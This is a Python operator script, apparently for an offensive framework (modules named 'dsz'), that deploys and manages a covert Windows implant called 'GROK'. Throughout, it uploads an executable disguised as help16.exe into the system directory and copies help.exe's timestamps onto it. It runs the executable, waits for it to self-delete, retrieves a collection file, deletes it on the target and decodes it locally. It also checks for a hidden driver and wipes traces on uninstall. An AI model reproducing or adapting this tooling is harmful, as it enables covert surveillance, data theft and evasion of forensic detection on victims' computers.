
import dsz.lp
import dsz.version
import dsz.ui
import dsz.path
import dsz.file
import dsz.control
import dsz.menu
import dsz.env
tool = 'Grok'
version = '1.2.0.1'
fileName = 'help16.exe'
resDir = dsz.lp.GetResourcesDirectory()
logdir = dsz.lp.GetLogsDirectory()
GROK_PATH = ('%s\\%s\\%s' % (resDir, tool, version))

def grokverify(input):
    storageSuccessFlag = True
    driverSuccessFlag = True
    success = True
    if dsz.file.Exists('tm154d.da', ('%s\\..\\temp' % systemPath)):
        dsz.ui.Echo('tm154d.da dump file exists ... this should not be here', dsz.ERROR)
    if dsz.file.Exists('tm154p.da', ('%s\\..\\temp' % systemPath)):
        dsz.ui.Echo('tm154p.da overflow file exists ... log may be full', dsz.ERROR)
    if dsz.file.Exists('tm154_.da', ('%s\\..\\temp' % systemPath)):
        dsz.ui.Echo('tm154_.da config file exists ... ', dsz.GOOD)
    if dsz.file.Exists('tm154o.da', ('%s\\..\\temp' % systemPath)):
        dsz.ui.Echo('tm154o.da storage file exists ... SUCCESSFUL', dsz.GOOD)
    else:
        dsz.ui.Echo('tm154o.da storage file missing ... FAILED', dsz.ERROR)
        storageSuccessFlag = False
    if dsz.file.Exists('msrtdv.sys', ('%s\\drivers' % systemPath)):
        dsz.ui.Echo('msrtdv.sys driver exists ... SUCCESSFUL', dsz.GOOD)
    else:
        dsz.ui.Echo('msrtdv.sys driver missing ... FAILED', dsz.ERROR)
        driverSuccessFlag = False
    if driverSuccessFlag and storageSuccessFlag:
        dsz.ui.Echo('GROK properly installed on target', dsz.GOOD)
    elif not driverSuccessFlag and storageSuccessFlag or driverSuccessFlag:
        dsz.ui.Echo('GROK is in a bad state', dsz.WARNING)
        success = False
    else:
        dsz.ui.Echo("GROK doesn't exist on target!", dsz.ERROR)
        success = False
    return success

def putfile(localfile, remotefile):
    dsz.ui.Echo(f'Putting {localfile} on target as {remotefile}')
    cmd = f'put {localfile} -name {remotefile}'
    dsz.control.echo.Off()
    global putid
    (runsuccess, putid) = dsz.cmd.RunEx(cmd)
    dsz.control.echo.On()
    if (not runsuccess):
        dsz.ui.Echo(f'Could not put {localfile} on target as {remotefile}', dsz.ERROR)
        return False
    dsz.ui.Echo(f'Successfully put {localfile} on target as {remotefile}')
    cmd = ('matchfiletimes -src %s\\help.exe -dst %s' % (systemPath, remotefile))
    dsz.control.echo.Off()
    runsuccess = dsz.cmd.Run(cmd)
    dsz.control.echo.On()
    if (not runsuccess):
        dsz.ui.Echo(('Could not matchfiletimes -src %s\\help.exe to -dst %s' % (systemPath, remotefile)), dsz.ERROR)
        dsz.ui.Echo('Make sure to manually delete it!!!', dsz.ERROR)
        return False
    dsz.ui.Echo(('Matchfiletimes -src %s\\help.exe to -dst %s' % (systemPath, remotefile)))
    return True

def runfile(remotefile):
    dsz.ui.Echo(f'Running {remotefile}')
    cmd = ('run -command "%s"' % remotefile)
    dsz.control.echo.Off()
    runsuccess = dsz.cmd.Run(cmd)
    dsz.control.echo.On()
    if (not runsuccess):
        dsz.ui.Echo(f'Running {remotefile} failed!!!', dsz.ERROR)
        dsz.ui.Echo('Make sure to manually clean!!!', dsz.ERROR)
        return False
    return True

def collectfiles(temppath):
    dsz.ui.Echo(('Getting collection file, %s\\Tprf3~' % temppath))
    cmd = ('get %s\\Tprf3~' % temppath)
    dsz.control.echo.Off()
    runsuccess = dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    if (not runsuccess):
        dsz.ui.Echo(('Could not get collection file, %s\\Tprf3~' % temppath), dsz.ERROR)
        return False
    getfilename = dsz.cmd.data.Get('FileLocalName::localname', dsz.TYPE_STRING)[0]
    dsz.ui.Echo(('Deleting collection file, %s\\Tprf3~' % temppath))
    cmd = ('delete %s\\Tprf3~' % temppath)
    dsz.control.echo.Off()
    runsuccess = dsz.cmd.Run(cmd)
    dsz.control.echo.On()
    if (not runsuccess):
        dsz.ui.Echo(('Could not delete collection file, %s\\Tprf3~' % temppath), dsz.ERROR)
        return False
    dsz.ui.Echo('Moving file to NOSEND directory...')
    dsz.control.echo.Off()
    dsz.cmd.Run(('local mkdir %s\\GetFiles\\NOSEND' % logdir))
    dsz.cmd.Run(('local mkdir %s\\GetFiles\\Grok_Decrypted' % logdir))
    cmd = ('local move %s\\GetFiles\\%s %s\\GetFiles\\NOSEND\\%s' % (logdir, getfilename, logdir, getfilename))
    runsuccess = dsz.cmd.Run(cmd)
    dsz.control.echo.On()
    success = parsefile(('%s\\GetFiles\\NOSEND\\%s' % (logdir, getfilename)))
    return bool(success)

def parsefile(file):
    (path, filename) = dsz.path.Split(file)
    cmd = ('local run -command "%s\\Offline\\GkDecoder.exe %s %s\\GetFiles\\Grok_Decrypted\\%s.xml"' % (GROK_PATH, file, logdir, filename))
    dsz.control.echo.Off()
    runsuccess = dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    if (not runsuccess):
        dsz.ui.Echo('There was an error parsing the collection', dsz.ERROR)
        return False
    return True

def grokparse(input):
    fullpath = dsz.ui.GetString('Please enter the full path to the file you want parse: ', '')
    if (fullpath == ''):
        dsz.ui.Echo('No string entered', dsz.ERROR)
        return False
    success = parsefile(fullpath)
    return bool(success)

def sleepwait():
    while True:
        dsz.ui.Echo('Sleeping 5s to see if exe self deletes')
        dsz.Sleep(5000)
        if (not dsz.file.Exists(fileName, systemPath)):
            dsz.ui.Echo('Executeable self deleted, good to go')
            return True
        else:
            dsz.ui.Echo('Executeable did not self delete', dsz.ERROR)

def cdtotemp():
    dsz.control.echo.Off()
    cmd = 'pwd'
    dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD)
    curpath = dsz.cmd.data.Get('CurrentDirectory::path', dsz.TYPE_STRING)[0]
    temppath = ('%s\\..\\temp' % systemPath)
    cmd = f'cd {temppath}'
    dsz.cmd.Run(cmd)
    dsz.control.echo.On()
    return (temppath, curpath)

def cdreturn(curpath):
    dsz.control.echo.Off()
    cmd = f'cd {curpath}'
    dsz.cmd.Run(cmd)
    dsz.control.echo.On()
    return True

def grokinstall(input):
    success = putfile(('%s\\Uploads\\msgki.ex_' % GROK_PATH), ('%s\\%s' % (systemPath, fileName)))
    if (not success):
        return False
    success = runfile(('%s\\%s' % (systemPath, fileName)))
    if (not success):
        return False
    sleepwait()
    return True

def grokcollect(input):
    success = putfile(('%s\\Uploads\\msgkd.ex_' % GROK_PATH), ('%s\\%s' % (systemPath, fileName)))
    if (not success):
        return False
    (temppath, curpath) = cdtotemp()
    success = runfile(('%s\\%s' % (systemPath, fileName)))
    if (not success):
        return False
    sleepwait()
    cdreturn(curpath)
    success = collectfiles(temppath)
    return bool(success)

def grokuninstall(input):
    success = putfile(('%s\\Uploads\\msgku.ex_' % GROK_PATH), ('%s\\%s' % (systemPath, fileName)))
    if (not success):
        return False
    (temppath, curpath) = cdtotemp()
    success = runfile(('%s\\%s' % (systemPath, fileName)))
    if (not success):
        return False
    sleepwait()
    cdreturn(curpath)
    success = collectfiles(temppath)
    if (not success):
        return False
    if dsz.file.Exists('tm154*.da', ('%s\\..\\temp' % systemPath)):
        dsz.ui.Echo('tm154*.da files exist, deleting')
        cmd = ('delete -mask tm154*.da -path %s\\..\\temp' % systemPath)
        dsz.control.echo.Off()
        runsuccess = dsz.cmd.Run(cmd)
        dsz.control.echo.On()
        if (not runsuccess):
            dsz.ui.Echo('Failed to delete tm154*.da', dsz.ERROR)
    return True

def changename(input):
    global fileName
    fileName = dsz.ui.GetString('New upload name for GROK:', 'help16.exe')
    dsz.ui.Echo(f'*** Upload name now set to {fileName} ***', dsz.WARNING)

def main():
    menuOption = 0
    if (not dsz.version.checks.IsWindows()):
        dsz.ui.Echo('GROK requires a Windows OS', dsz.ERROR)
        return 0
    if dsz.version.checks.IsOs64Bit():
        dsz.ui.Echo(f'GROK {version} requires x86', dsz.ERROR)
        return 0
    if dsz.path.windows.GetSystemPath():
        global systemPath
        systemPath = dsz.path.windows.GetSystemPath()
    else:
        dsz.ui.Echo('Could not find system path', dsz.ERROR)
        return 0
    menu_list = [
        {dsz.menu.Name: 'Install', dsz.menu.Function: grokinstall},
        {dsz.menu.Name: 'Uninstall', dsz.menu.Function: grokuninstall},
        {dsz.menu.Name: 'Verify Install', dsz.menu.Function: grokverify},
        {dsz.menu.Name: 'Collect and Parse', dsz.menu.Function: grokcollect},
        {dsz.menu.Name: 'Parse Local', dsz.menu.Function: grokparse},
        {dsz.menu.Name: 'Change Upload Name', dsz.menu.Function: changename},
    ]

    while (menuOption != (-1)):
        (retvalue, menuOption) = dsz.menu.ExecuteSimpleMenu(('\n\n========================\nGrok %s Menu\n========================\nUpload Name: %s\n' % (version, fileName)), menu_list)
        if (menuOption == 0):
            if (retvalue == True):
                dsz.lp.RecordToolUse(tool, version, 'DEPLOYED', 'Successful')
            if (retvalue == False):
                dsz.lp.RecordToolUse(tool, version, 'DEPLOYED', 'Unsuccessful')
            dsz.control.echo.Off()
            cmd = f'stop {putid}'
            dsz.cmd.Run(cmd)
            dsz.control.echo.On()
        elif menuOption == 1:
            if (retvalue == True):
                dsz.lp.RecordToolUse(tool, version, 'DELETED', 'Successful')
            if (retvalue == False):
                dsz.lp.RecordToolUse(tool, version, 'DELETED', 'Unsuccessful')
            dsz.control.echo.Off()
            cmd = f'stop {putid}'
            dsz.cmd.Run(cmd)
            dsz.control.echo.On()
        elif (menuOption == 2):
            if (retvalue == True):
                dsz.lp.RecordToolUse(tool, version, 'EXERCISED', 'Successful')
            if (retvalue == False):
                dsz.lp.RecordToolUse(tool, version, 'EXERCISED', 'Unsuccessful')
        elif menuOption == 3:
            if (retvalue == True):
                dsz.lp.RecordToolUse(tool, version, 'EXERCISED', 'Successful')
            if (retvalue == False):
                dsz.lp.RecordToolUse(tool, version, 'EXERCISED', 'Unsuccessful')
            dsz.control.echo.Off()
            cmd = f'stop {putid}'
            dsz.cmd.Run(cmd)
            dsz.control.echo.On()
    dsz.ui.Echo('***************************')
    dsz.ui.Echo('*  GROK script completed. *')
    dsz.ui.Echo('***************************')
    return 0
if (__name__ == '__main__'):
    main()